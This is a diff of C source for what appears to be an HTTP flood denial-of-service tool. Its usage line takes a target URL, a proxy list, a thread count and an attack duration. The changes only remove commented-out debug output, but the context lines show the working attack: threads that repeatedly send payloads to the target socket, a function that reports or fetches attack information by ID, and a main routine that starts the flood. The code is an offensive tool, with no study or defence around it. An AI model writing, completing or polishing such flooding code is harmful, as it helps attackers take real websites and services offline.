@@ -184,12 +184,7 @@ void *flood(void *par) {
 		sent = send(serverSocket, httppayload, strlen(httppayload), MSG_NOSIGNAL);
 		//printf("sent main payload %d\n", sent);
 		free(httppayload);
-		//char *postshit = "Z";
-		//while(send(serverSocket, postshit, 1, MSG_NOSIGNAL) > 0)
-	//	{
-	//		sleep(1);
-			//printf(".");
-	//	}
+		
 		int success;
 		do
 		{
@@ -200,7 +195,6 @@ void *flood(void *par) {
 		} while (success > 0);
 		close(serverSocket);
 		usleep(30000);
-		//startpoint = startpoint->next;
 	}
 }
 
@@ -247,8 +241,7 @@ int fnAttackInformation(int attackID)
 	}
 		
 	tmpres = send(sock, packet, strlen(packet), 0);
-	
-	//printf("Sent %d bytes -> \n%s\n\n\n", tmpres, packet);	
+		
 	
 	if (tmpres == -1){
 		perror("Can't send query");
@@ -262,7 +255,6 @@ int fnAttackInformation(int attackID)
 	while (1)
 	{
 		i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0);
-		//printf("Received %d bytes\n", i);
 		if (i <= 0)
 			break;
 			
@@ -271,13 +263,9 @@ int fnAttackInformation(int attackID)
 
 	szRecvBuff[dwTotal] = '\0';
 	
-
-	//printf("Received -> \n%s\n\n", szRecvBuff);
-
 	
 	close(sock);
 	
-	//printf("Sent %d bytes\n", tmpres);
 	
 	return 0;
 }
@@ -288,7 +276,7 @@ int main(int argc, char *argv[ ]) {
 		fprintf(stdout, "Usage: %s <target url> <auto scrape (1 or 0)> <number threads to use> <proxy list> <time> [manual ip (0 to disable)] [manual parameter]\n", argv[0]);
 		exit(-1);
 	}
-	//fprintf(stdout, "Setting up Sockets...\n");
+	
 	int num_threads = atoi(argv[3]);
 	int scrapeit = atoi(argv[2]);
 	FILE *pFile = fopen(argv[4], "rb");
@@ -367,7 +355,7 @@ int main(int argc, char *argv[ ]) {
 	{
 		ipstr = malloc(strlen(argv[6])+1);
 		strcpy(ipstr, argv[6]);
-		//fprintf(stdout, "Using manual IP...\n");
+		
 	} else {
 		struct hostent *he;
 		struct in_addr a;
@@ -838,7 +826,6 @@ END:
 	sprintf(postpayload, postformat, returnparts[path]->value, returnparts[host]->value, targetparameter);
 	freeparts();
 	
-	//fprintf(stdout, "Starting Flood...\n");
 	
 	fnAttackInformation(atoi(argv[argc-1]));
 	
